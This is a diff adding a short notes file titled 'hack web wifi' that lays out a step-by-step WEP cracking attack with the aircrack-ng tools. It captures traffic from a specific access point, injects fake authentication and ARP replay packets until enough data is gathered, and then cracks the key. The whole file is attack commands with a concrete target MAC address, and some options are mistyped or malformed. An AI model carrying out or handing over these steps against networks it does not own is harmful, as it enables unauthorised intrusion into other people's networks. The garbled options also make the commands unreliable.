@@ -1,0 +1,13 @@
+hack web wifi:
+airodump-ng --band abg wlan0mon
+airodump-ng --band abg -c 5 --bssid 04:.... -w wep_hacking wlan0 // w to write result I am getting
+keep first terminal
+now have 2 new terminals
+terminal 1:
+aireplay-ng -- fakeauth 6000 -q 10 -o 1 -a 04:5E:A4:72:52:9F -e ETH -101 wlan0
+terminal 2:
+aireplay-ng --arpreplay -b 04:5E:A4:72:52:9F wlan0
+keep them both running till the data reaches to 15000
+now we need to crack the wifi:
+aircrack-ng wep_hacking-01.cap
+
